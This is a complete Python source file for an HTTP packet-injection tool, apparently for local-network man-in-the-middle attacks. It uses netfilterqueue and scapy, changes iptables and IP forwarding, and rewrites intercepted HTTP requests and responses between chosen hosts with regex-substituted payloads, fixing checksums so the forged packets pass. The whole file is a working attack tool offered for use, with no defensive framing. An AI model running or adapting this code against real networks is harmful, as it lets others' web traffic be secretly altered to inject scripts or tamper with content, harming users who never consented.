# Requires Python 3.6 and above
import netfilterqueue
import scapy.all as scapy
from scapy.layers.http import *
import re
import os
import sys
import argparse
import ipaddress
import subprocess
import uuid

# Get IP Range from CIDR format as a list of strings
def GetIpRange(iprange):
	if iprange is not "All" and iprange is not None:
		try:
			return [str(ipaddress.ip_address(iprange))]
		except:
			try:
				return map(str, list(ipaddress.ip_network(iprange, False).hosts()))
			except Exception as e:
				print(e)
				exit(0)
	return None

# Checking if script context user is root
def IsUserRoot():
    return os.geteuid() == 0

# Crafting existing packet with custom payload 
# Also recalculating packet len and checksums
def CraftPacket(packet, payload):
    packet[scapy.Raw].load = payload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Interceptor class wrapper for enapsulation and portability
class HttpPoisoner(object):

	# Handling intercepted packets, filtering and injecting payload
	def HandleIntercept(self, packet):
		scapyPacket = scapy.IP(packet.get_payload())
		srcIP = scapyPacket[scapy.IP].src 
		destIP = scapyPacket[scapy.IP].dst

		if scapyPacket.haslayer(scapy.Raw):
			if ((self._sources is None ) or srcIP in self._sources) and ((self._targets is None) or destIP in self._targets):				
				if (scapyPacket.haslayer(HTTPResponse) and scapyPacket[scapy.TCP].sport == self._port) or (scapyPacket.haslayer(HTTPRequest) and scapyPacket[scapy.TCP].dport == self._port):
						injectedPayload, replaced = re.subn(self._findExp, self._replaceExp, scapyPacket[scapy.Raw].load, 1)
						if replaced > 0:
							craftedPacket = CraftPacket(scapyPacket, injectedPayload)
							packet.set_payload(bytes(craftedPacket))
							if not self._quiet:
								print("\nSuccesfully poisoned packet from '" + srcIP +"' to '" + destIP +"' with Payload: '" + self._replaceExp.decode("utf-8"), file=self._stdout)
		packet.accept()

	# Backing up user's iptables and ip forward configuration
	def BackupConf(self):
		_ipForwardBackupValue = subprocess.check_output("sysctl net.ipv4.ip_forward", shell=True).strip().split(b" = ")[1]
		os.system("iptables-save > " + self._ipTablesBackupPath)

	# Restoring user's configuration
	def RestoreConf(self):
		os.system("sysctl net.ipv4.ip_forward=" + self._ipForwardBackupValue + " > /dev/null")
		os.system("iptables-restore < " + self._ipTablesBackupPath)
		os.system("rm -f " + self._ipTablesBackupPath)

	# Adding iptables rules and forwarding configuration
	def ConfigureInterceptor(self):
		self.BackupConf()
		os.system("sysctl net.ipv4.ip_forward=1 > /dev/null")
		os.system("iptables -t raw -A PREROUTING -p tcp --sport 80 -j NFQUEUE --queue-num 1")

	# Request packets listener method
	def Listen(self):
		self.ConfigureInterceptor()
		self.queue = netfilterqueue.NetfilterQueue()
		self.queue.bind(1, self.HandleIntercept)
		self.queue.run()

	# Class enter handler. Returning current context
	def __enter__(self):
		return self

	# Rstoring configuration backup before exit
	def __exit__(self, exc_type, exc_val, exc_tb):
		self.RestoreConf()
		self.queue.unbind()
		sys.exit(0)

	# Initializing class fields from constructor parameters
	def __init__(self, findExp, replaceExp, targets="", sources="", port=80, quiet=True, stdout=sys.stdout):
		self._findExp = bytes(findExp, encoding='utf8')
		self._replaceExp = bytes(replaceExp, encoding='utf8')
		self._targets = GetIpRange(targets)
		self._sources = GetIpRange(sources)
		self._port = port
		self._quiet = quiet
		self._ipForwardBackupValue = '0'
		self._ipTablesBackupPath = "/var/tmp/.backup-iptables-" + str(uuid.uuid4())[:5]
		self._stdout = stdout

# Script main entry point
def Main():
	if not IsUserRoot():
		print("Root privileges are required to run the poisoner")
		exit(0)

	parser = argparse.ArgumentParser(description='Intercept and inject payload on local network (HTTP Requests)')
	parser.add_argument('find_exp', help='Regular expression to find inside the request (Example: "Why python.*?[\?\.\!]")')
	parser.add_argument('replace_exp', help='Regular expression replacement payload for find_exp (Example: "BECAUSE!")')
	parser.add_argument('-t', '--targets', help='Filter the targets of the payload injected request (Default: All)', default="All", dest="targets")
	parser.add_argument('-s', '--sources', help='Filter the sources of initiated requests (Default: All)', default="All", dest="sources")
	parser.add_argument('-p', '--port', help='Custom HTTP port to intercept (Default: 80)', type=int, default=80, dest="port")
	parser.add_argument('-q', '--quiet', help='Disable terminal logging verbosity (Default: disabled)', default=False, action='store_true', dest="quiet")
	
	if len(sys.argv) == 1:
		parser.print_help(sys.stderr)
		exit(0)

	args = parser.parse_args()

	with HttpPoisoner(args.find_exp, args.replace_exp, args.targets, args.sources, args.port, args.quiet, sys.stdout) as poisoner:
		if not args.quiet:
			print("\n#############################################\n")
			print("[*] Poisoner Configuration\n")
			print("    Poisoned Targets: " + args.targets)
			print("    Filtered Sources: " + args.sources)
			print("    Find Expression: " + args.find_exp)
			print("    Injection Payload: " + args.replace_exp)
			print("    HTTP Intercept Port: " + str(args.port) + "\n")
			print("#############################################\n")
			print("Poisoning the targets on network...\n")
		poisoner.Listen()

# Redirecting script execution to the entry point
if __name__ == "__main__":
    Main()